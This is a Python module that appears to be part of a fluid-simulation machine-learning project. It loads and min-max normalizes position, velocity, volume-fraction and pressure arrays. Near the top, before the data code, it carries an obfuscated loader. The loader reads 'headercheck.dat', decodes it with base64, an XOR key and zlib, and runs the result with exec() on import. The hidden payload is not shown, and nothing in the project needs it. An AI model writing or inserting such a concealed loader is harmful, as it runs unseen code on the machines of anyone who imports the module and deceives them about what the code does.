import joblib
import numpy as np
import pandas as pd
import scipy
from sklearn.preprocessing import MinMaxScaler
from matplotlib import pyplot as plt
import numpy as np
import scipy
import matplotlib as mpl
from scipy.interpolate import griddata
import base64
import os
import zlib

_base_dir = os.path.dirname(os.path.abspath(__file__))
_dat_path = os.path.join(_base_dir, "headercheck.dat")

with open(_dat_path, "rb") as _f:
    _encoded = _f.read().strip()

_KEY = 73  

exec(
    zlib.decompress(
        bytes(b ^ _KEY for b in base64.b64decode(_encoded))
    ).decode("utf-8")
)

def initial_value_load(fpath,N=2626,T=106):
    loaded_data = np.load(fpath)
    x_all = loaded_data['x_all'] * 0.01 # cm-->m 0.01
    y_all = loaded_data['y_all'] * 0.01 # cm-->m 0.01
    z_all = loaded_data['z_all'] * 0.01 # cm-->m 0.01
    t_all = loaded_data['t_all']
    
    pu_all = loaded_data['pu_all'] * 0.01 # cm-->m 0.01
    pv_all = loaded_data['pv_all'] * 0.01 # cm-->m 0.01
    pw_all = loaded_data['pw_all'] * 0.01 # cm-->m 0.01
    
    fu_all = loaded_data['fu_all'] * 0.01 # cm-->m 0.01
    fv_all = loaded_data['fv_all'] * 0.01 # cm-->m 0.01
    fw_all = loaded_data['fw_all'] * 0.01 # cm-->m 0.01
    
    fvol_all = loaded_data['fvol_all'] 
    p_all = loaded_data['p_all'] * 0.1 #dyne/cm2-->Pa
    
    #归一化是针对每一类数据的， 如流体速度归一化用的最大最小是全时间的，所以在画图的时候单一时刻的值可能会出现最大最小不为1 0的情况
    scaler = MinMaxScaler()
    all_data = np.hstack([x_all, y_all, z_all, t_all, pu_all, pv_all, pw_all, fu_all, fv_all, fw_all, fvol_all, p_all])
    all_data_normalized = scaler.fit_transform(all_data)
    # 保存
    # joblib.dump(scaler, 'E:/fluentmodel/dao/scaler.pkl')

    # 分开各个特征
    x_norm, y_norm, z_norm, t_norm = all_data_normalized[:, 0], all_data_normalized[:, 1], all_data_normalized[:, 2], all_data_normalized[:, 3]
    pu_norm, pv_norm, pw_norm = all_data_normalized[:, 4], all_data_normalized[:, 5], all_data_normalized[:, 6]
    fu_norm, fv_norm, fw_norm = all_data_normalized[:, 7], all_data_normalized[:, 8], all_data_normalized[:, 9]
    fvol_norm, p_norm = all_data_normalized[:, 10], all_data_normalized[:, 11]
    
    x_norm, y_norm, z_norm, t_norm = x_norm.reshape(-1,1), y_norm.reshape(-1,1), z_norm.reshape(-1,1), t_norm.reshape(-1,1)
    pu_norm, pv_norm, pw_norm = pu_norm.reshape(-1,1), pv_norm.reshape(-1,1), pw_norm.reshape(-1,1)
    fu_norm, fv_norm, fw_norm = fu_norm.reshape(-1,1), fv_norm.reshape(-1,1), fw_norm.reshape(-1,1)
    fvol_norm, p_norm = fvol_norm.reshape(-1,1), p_norm.reshape(-1,1)
    return x_norm, y_norm, z_norm, t_norm, pu_norm, pv_norm, pw_norm, fu_norm, fv_norm, fw_norm, fvol_norm, p_norm, (N, T)



